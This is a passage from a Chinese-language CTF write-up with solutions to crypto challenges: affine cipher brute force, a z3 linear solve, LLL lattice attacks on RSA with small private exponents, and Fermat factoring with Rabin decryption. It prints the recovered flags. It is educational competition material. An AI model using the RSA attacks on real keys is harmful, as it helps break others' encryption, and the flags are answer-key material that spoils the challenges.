class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter=string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=(letter.index(ch) * a + b) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        Cipher = encrypt(<span class="string">&#x27;flag&#x27;</span>, a, b)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> Cipher==s[k:k+<span class="number">4</span>]:</span><br><span class="line">                <span class="built_in">print</span>(Cipher,a,b)</span><br><span class="line"><span class="comment"># korv 11 17</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">11</span></span><br><span class="line">b=<span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">m, a, b</span>):</span><br><span class="line">    <span class="keyword">import</span> gmpy2</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        ch=m[i]</span><br><span class="line">        t=((letter.index(ch) - b) * gmpy2.invert(a,<span class="number">62</span>)) % <span class="number">62</span></span><br><span class="line">        c.append(letter[t])</span><br><span class="line">    d = <span class="string">&#x27;&#x27;</span>.join(c)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">m=decrypt(s, a, b)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = hashlib.md5(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(m)).encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># Oh62Affine1sSti1lN0tSecureEnoughToProtectflag</span></span><br><span class="line"><span class="comment"># 2b9b99caae1cc49e5b5aacbc8cc22350</span></span><br></pre></td></tr></table></figure><p>flag：flag{2b9b99caae1cc49e5b5aacbc8cc22350}</p><p>​</p><h3 id="LINE-GENERATION-TEST"><a href="#LINE-GENERATION-TEST" class="headerlink" title="LINE-GENERATION-TEST"></a>LINE-GENERATION-TEST</h3><blockquote><p>“Sorry, Tazmi, I can’t hold you in my arms anymore” Who said that? flag{md5(result)}</p><p><img src="/2022/02/20/match-HSC-1th-2022/task.png" alt="task" style="zoom:80%"></p></blockquote><p>根据 <code>enc</code> 结果，猜测为 $\mod 26$ 下的矩阵运算，值对应字母序，简单用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f=[Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">out=[<span class="number">9</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line">ss.add((f[<span class="number">0</span>]+f[<span class="number">1</span>])%<span class="number">26</span>==out[<span class="number">0</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">1</span>])</span><br><span class="line">ss.add((f[<span class="number">2</span>]+f[<span class="number">3</span>]+f[<span class="number">4</span>])%<span class="number">26</span>==out[<span class="number">2</span>])</span><br><span class="line">ss.add((f[<span class="number">1</span>]+f[<span class="number">2</span>]+f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">3</span>])</span><br><span class="line">ss.add((f[<span class="number">3</span>])%<span class="number">26</span>==out[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ss.add(f[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    ss.add(f[i]&lt;<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(m[f[i]].as_long()+<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># RSCTF</span></span><br></pre></td></tr></table></figure><p>MD5，得flag：flag{e4163deba70420c58acb87abcab34141}</p><p>​</p><h3 id="LATTICE"><a href="#LATTICE" class="headerlink" title="LATTICE"></a>LATTICE</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;******&#125;&#x27;</span>.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">_length = <span class="built_in">len</span>(flag)</span><br><span class="line">f1, f2, f3 = [flag[_*_length//<span class="number">3</span>:(_+<span class="number">1</span>)*_length//<span class="number">3</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part1</span></span><br><span class="line">m1 = bytes_to_long(f1)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">phi1 = n1 - p1 - q1 + <span class="number">1</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">e1 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line">e2 = invert(getPrime(<span class="number">730</span>), phi1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1=<span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1=<span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c1=...</span></span><br><span class="line"><span class="comment"># n1=...</span></span><br><span class="line"><span class="comment"># e1, e2=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part2</span></span><br><span class="line">m2 = bytes_to_long(f2)</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">phi2 = n2 - p2 - q2 + <span class="number">1</span></span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">e1 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e2 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line">e3 = invert(getPrime(<span class="number">818</span>), phi2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2=<span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2=<span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1, e2, e3=<span class="subst">&#123;e1&#125;</span>, <span class="subst">&#123;e2&#125;</span>, <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># c2=...</span></span><br><span class="line"><span class="comment"># n2=...</span></span><br><span class="line"><span class="comment"># e1, e2, e3=...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># part3</span></span><br><span class="line">m3 = bytes_to_long(f3)</span><br><span class="line">nl = []</span><br><span class="line">cl = []</span><br><span class="line">el = []</span><br><span class="line">d = getPrime(<span class="number">890</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q3 = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n3 = p3 * q3</span><br><span class="line">    phi3 = n3 - p3 - q3 + <span class="number">1</span></span><br><span class="line">    e3 = invert(d, phi3)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3, e3, n3)</span><br><span class="line">    nl.append(n3)</span><br><span class="line">    el.append(<span class="built_in">int</span>(e3))</span><br><span class="line">    cl.append(<span class="built_in">int</span>(c3))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;nl=<span class="subst">&#123;nl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;el=<span class="subst">&#123;el&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cl=<span class="subst">&#123;cl&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># nl=[...]</span></span><br><span class="line"><span class="comment"># el=[...]</span></span><br><span class="line"><span class="comment"># cl=[...]</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA的两种涉及格的LLL算法的攻击情形（多组低解密指数攻击+共私钥指数攻击）。</p><p>Part1，2组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**<span class="number">0.5</span>)</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [N, M1, M2, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi = (x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]*e1).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;89c63fd5-00c&#x27;</span></span><br></pre></td></tr></table></figure><p>Part2，3组 $e$ 的低解密指数攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">e3 = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    alpha2 = i/<span class="number">1000</span></span><br><span class="line">    M1 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span>))</span><br><span class="line">    M2 = <span class="built_in">int</span>( gmpy2.mpz(N) )</span><br><span class="line">    M3 = <span class="built_in">int</span>(gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3，共私钥指数 $d$ 攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>连接得flag：flag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>​</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>费马分解RSA，发现 $\gcd(e,\varphi(n))=2$，令 $e’=\frac{e}{2},m’=m^2$，</p><p>先求出 $m’$，再利用Rabin算法求 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">	n = p * q</span><br><span class="line">	mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, 